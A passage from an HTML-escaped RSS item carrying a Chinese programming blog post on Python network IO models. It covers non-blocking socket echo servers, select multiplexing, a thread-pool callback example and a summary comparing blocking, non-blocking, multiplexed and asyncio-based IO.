        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 把连接成功的客户端存起来&lt;/span&gt;
&lt;span&gt;        clients.append(conn)
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; BlockingIOError:
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;没有可以处理的连接 就干别的活儿&quot;)&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;要处理的是已经连接成功的客户端&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 接收数据&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; clients:
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                data &lt;/span&gt;= c.recv(1024&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; data:
                    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对方关闭了连接&lt;/span&gt;
&lt;span&gt;                    c.close()
                    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从客户端列表中删除它&lt;/span&gt;
&lt;span&gt;                    closed_cs.append(c)
                    &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;
                &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;收到%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; % data.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 现在非阻塞 send直接往缓存赛 如果缓存满了 肯定有错误  需要单独处理发送&lt;/span&gt;
                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; c.send(data.upper())&lt;/span&gt;
&lt;span&gt;                send_datas.append((c,data))
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; BlockingIOError:
                &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
            &lt;span&gt;except&lt;/span&gt;&lt;span&gt; ConnectionResetError:
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对方关闭了连接&lt;/span&gt;
&lt;span&gt;                c.close()
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从客户端列表中删除它&lt;/span&gt;
&lt;span&gt;                closed_cs.append(c)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 处理发送数据&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; data &lt;span&gt;in&lt;/span&gt;&lt;span&gt; send_datas:
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                data[0].send(data[&lt;/span&gt;1&lt;span&gt;].upper())
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发送成功需要删除 不能直接删除&lt;/span&gt;
                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; send_datas.remove(data)&lt;/span&gt;
&lt;span&gt;                del_datas.append(data)
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; BlockingIOError:
                &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;
            &lt;span&gt;except&lt;/span&gt;&lt;span&gt; ConnectionResetError:
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 客户端连接需要删除&lt;/span&gt;
&lt;span&gt;                data[0].close()
                closed_cs.append(data[0])
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 等待发送的数据需要删除&lt;/span&gt;
&lt;span&gt;                del_datas.append(data)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除无用的数据&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; d &lt;span&gt;in&lt;/span&gt;&lt;span&gt; del_datas:
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;从待发送的列表中删除&lt;/span&gt;
&lt;span&gt;            send_datas.remove(d)
        del_datas.clear()
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; closed_cs:
            clients.remove(c)
        closed_cs.clear()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;服务器&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_a8ff9aae-9f57-4412-ba6e-2e2baf8cc2bc&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_a8ff9aae-9f57-4412-ba6e-2e2baf8cc2bc&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_a8ff9aae-9f57-4412-ba6e-2e2baf8cc2bc&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket

c &lt;/span&gt;=&lt;span&gt; socket.socket()

c.connect((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
    msg &lt;/span&gt;= input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; msg:&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;
    c.send(msg.encode(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
    data &lt;/span&gt;= c.recv(1024&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(data.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;客服端&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_5bbd1089-8e5e-4fb6-9484-39372c82683f&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_5bbd1089-8e5e-4fb6-9484-39372c82683f&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_5bbd1089-8e5e-4fb6-9484-39372c82683f&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
li = [1,2,3,4,5,6&lt;span&gt;]
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; mytlist_iter():
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(len(li)):
        &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt;&lt;span&gt; li[i]


&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; j &lt;span&gt;in&lt;/span&gt;&lt;span&gt; mytlist_iter():
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; j == 5&lt;span&gt;:
        li.append(&lt;/span&gt;1000&lt;span&gt;)


d &lt;/span&gt;= {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:1,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:2&lt;span&gt;}
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; k &lt;span&gt;in&lt;/span&gt;&lt;span&gt; d:
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; k == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
        d.pop(k)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;迭代期间不能修改被迭代的对象&lt;/span&gt; &lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1442172/201811/1442172-20181116205826706-680572056.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37.5&quot;&gt;&lt;img id=&quot;code_img_closed_8a699fa7-d2ef-432a-8f8a-a87555b7657f&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_8a699fa7-d2ef-432a-8f8a-a87555b7657f&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8a699fa7-d2ef-432a-8f8a-a87555b7657f&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; concurrent.futures &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; select
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; select 帮你从一堆连接中找出来需要被处理的连接&lt;/span&gt;
&lt;span&gt;
server &lt;/span&gt;=&lt;span&gt; socket.socket()
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 重用端口&lt;/span&gt;
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1&lt;span&gt;)

server.bind((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.11.210&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

server.listen(&lt;/span&gt;5&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 设置是否为阻塞 默认阻塞&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; server.setblocking(False)&lt;/span&gt;

&lt;span&gt;def&lt;/span&gt;&lt;span&gt; data_handler(conn):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;一个新连接..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        data &lt;/span&gt;= conn.recv(1024&lt;span&gt;)
        conn.send(data.upper())

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 需要检测的 是否可读取的列表  (recv就是一个读取操作)&lt;/span&gt;
rlist =&lt;span&gt; [server,]
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 需要检测的 是否写入的列表  (send就是写入操作)&lt;/span&gt;
wlist =&lt;span&gt; []

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 需要发送的数据 目前是因为 我们要把接收的数据在发回去 所以搞了这个东西 正常没有这种需求&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 目前客户端与服务器端 交互 是必须客户端发送数据 服务器端才能返回数据   正常没有这种需求&lt;/span&gt;
dic =&lt;span&gt; {}


&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; True: &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 用于检测需要处理的连接 需要不断检测 所以循环&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; rl目前可读的客户端列表  wl目前可写的客户端列表&lt;/span&gt;
    rl,wl,xl = select.select(rlist,wlist,[]) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; select默认阻塞 阻塞到任意一个连接可以被处理&lt;/span&gt;
    &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(len(rl))
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 处理可读的socket&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; rl:
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 无论是客户端还是服务器只要可读就会执行到这里&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; c ==&lt;span&gt; server:
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 接收客户端的连接请求 (一个读操作)&lt;/span&gt;
            conn,addr =&lt;span&gt; c.accept()
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 将新连接也交给select来检测&lt;/span&gt;
&lt;span&gt;            rlist.append(conn)
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;:&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 不是服务器 就是客户端 客户端可读 可以执行recv&lt;/span&gt;
            &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                data &lt;/span&gt;= c.recv(1024&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; data:
                    c.close()
                    rlist.remove(c)
                &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s 发送 %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; % (c,data.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)))
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 给客户端发送数据 前要保证目前可以发送 将客户端加入检测列表&lt;/span&gt;
                wlist.append(c)  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 正常开发中 不可能必须客户端发送数据过来后 才能 给客户端发送&lt;/span&gt;
                                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 所以这个添加到检测列表的操作 应该建立连接后立即执行&lt;/span&gt;
                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 要发送的数据&lt;/span&gt;
                dic[c] =&lt;span&gt; data
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ConnectionResetError:
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 客户端关闭连接&lt;/span&gt;
&lt;span&gt;                c.close()
                rlist.remove(c)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 处理可写的socket&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; wl:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(c)
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
            c.send(dic[c].upper())
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除数据&lt;/span&gt;
&lt;span&gt;            dic.pop(c)
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从检测列表中删除已发送完成的客户端&lt;/span&gt;
&lt;span&gt;            wlist.remove(c)
        &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ConnectionResetError:
            c.close() &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 关闭连接&lt;/span&gt;
            dic.pop(c) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除要发送的数据&lt;/span&gt;
            wlist.remove(c) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从待检测的列表中删除&lt;/span&gt;
        &lt;span&gt;except&lt;/span&gt; BlockingIOError:&lt;span&gt;#&lt;/span&gt;&lt;span&gt;可能缓存满了 发不了&lt;/span&gt;
            &lt;span&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;服务器&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_ac43e747-b47b-4176-8e87-fa9c1fdfd86d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ac43e747-b47b-4176-8e87-fa9c1fdfd86d&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ac43e747-b47b-4176-8e87-fa9c1fdfd86d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket

c &lt;/span&gt;=&lt;span&gt; socket.socket()

c.connect((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.11.210&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
    msg &lt;/span&gt;= input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; msg:&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;
    c.send(msg.encode(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
    data &lt;/span&gt;= c.recv(1024&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(data.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;客户端&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_d4ddafd5-ebcc-42f2-bc73-4b5ec151b230&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_d4ddafd5-ebcc-42f2-bc73-4b5ec151b230&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d4ddafd5-ebcc-42f2-bc73-4b5ec151b230&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; asyncio
asyncio.coroutine()
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; concurrent.futures &lt;span&gt;import&lt;/span&gt;&lt;span&gt;  ThreadPoolExecutor

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; task():
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    with open(r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;D:\python视频存放目录\上海python全栈4期\day40\多路复用,降低CPU占用\服务器.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f:
        text &lt;/span&gt;=&lt;span&gt; f.read()
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; f.write()&lt;/span&gt;
    &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; text


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; fin(f):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;fin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(f.result())


pool &lt;/span&gt;= ThreadPoolExecutor(1&lt;span&gt;)
future &lt;/span&gt;=&lt;span&gt; pool.submit(task)
future.add_done_callback(fin)

&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;主 over&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 这种方式看起来像是异步IO 但是对于子线程而言不是&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 在子线程中 执行read 是阻塞的 以为CPU必须切走 但是不能保证切到当前程序的其他线程&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 想要的效果就是 在执行read 是不阻塞 还能干其他活   谁能实现  只有协程&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; asyncio 内部是使用的是协程&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;模拟异步IO&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;conclusion：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;网络 IO模型&lt;/span&gt;&lt;br/&gt;&lt;span&gt;一、阻塞IO模型&lt;/span&gt;&lt;br/&gt;&lt;span&gt;多线程 多进程 线程池 进程池 全是阻塞IO&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;二、非阻塞IO&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;协程是一种非阻塞IO&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;1.setblocking(False) 将阻塞修改为非阻塞&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2.一旦是非阻塞 在执行accept recv send 就会立马尝试读写数据 一旦数据没准备好就抛异常&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3.捕获异常&lt;/span&gt;&lt;br/&gt;&lt;span&gt;4.如果没有异常说明数据准备好了 直接处理&lt;/span&gt;&lt;br/&gt;&lt;span&gt;5.捕获到异常 那就做别的事情&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可以实现单线程并发的效果 会大量占用CPU资源&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;三、多路复用&lt;/span&gt;&lt;br/&gt;&lt;span&gt;将所有连接交给select来管理 管什么? 管哪个连接可以被处理&lt;/span&gt;&lt;br/&gt;&lt;span&gt;作为处理任务的一方事情变少了 不需要重复不断的问操作系统拿数据 而是等待select返回需要处理的连接，&lt;/span&gt;&lt;span&gt;等待则意味着select是阻塞的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;异步IO 不仅仅指网络IO 也包括本地IO&lt;/span&gt;&lt;br/&gt;&lt;span&gt;非阻塞IO 和 多路复用 解决都是网络IO的阻塞问题&lt;/span&gt;&lt;br/&gt;&lt;span&gt;本地IO 可以通过子线程 或子进程 来避免阻塞 但是对子线程或子进程而言 依然会阻塞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最终的解决方案就是协程 asyncio 该模快实现异步IO 内部使用协程实现&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 19 Nov 2018 13:27:00 +0000</pubDate>
<dc:creator>伍萬磊</dc:creator>
<og:description>一、阻塞IO（blocking IO） from concurrent.futures import ThreadPoolExecutor import socket server = socket.</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wanlei/p/9965416.html</dc:identifier>
</item>
</channel>
</rss>